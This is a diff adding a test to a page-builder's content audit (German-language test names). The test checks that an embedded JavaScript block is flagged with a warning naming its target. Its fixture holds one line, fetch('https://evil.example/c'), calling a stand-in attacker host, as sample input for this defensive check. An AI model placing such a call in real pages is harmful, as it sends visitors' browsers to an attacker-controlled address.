@@ -79,3 +79,13 @@ test('Audit: sichtbarer Text wird gegen denselben Wert geprüft, den die Meldung
   assert.doesNotMatch(text, /[–—]/);
   assert.match(auditSummary(a), /\[SEO, wichtig\] 1 Link\(s\) mit kaputtem.*: Link „hier“ \(\/x\): Produkt 1 existiert nicht/);
 });
+
+test('Qualitäts-Check: JavaScript im Entwurf ergibt einen wichtigen Hinweis mit den Zieladressen (alle Seitentypen)', () => {
+  const blocks = [{ type: 'custom-html', html: '<div>x</div>', js: "fetch('https://evil.example/c')" }, { type: 'text', html: '<h1>Titel</h1><p>Text</p>' }];
+  for (const type of ['landingpage', 'product_list', 'product_detail']) {
+    const a = auditSpec({ name: 'T', type, sections: [{ blocks }] } as unknown as PageSpec);
+    assert.match(a.warnings[0] ?? '', /Wichtig: .*JavaScript.*evil\.example/, type);
+  }
+  assert.match(auditSpec({ name: 'T', type: 'product_detail', sections: [{ blocks }] } as unknown as PageSpec, null, { format: 'html' }).warnings[0] ?? '', /JavaScript/);
+  assert.ok(!auditSpec({ name: 'T', type: 'landingpage', sections: [{ blocks: [blocks[1]] }] } as unknown as PageSpec).warnings.some(w => /JavaScript/.test(w)));
+});
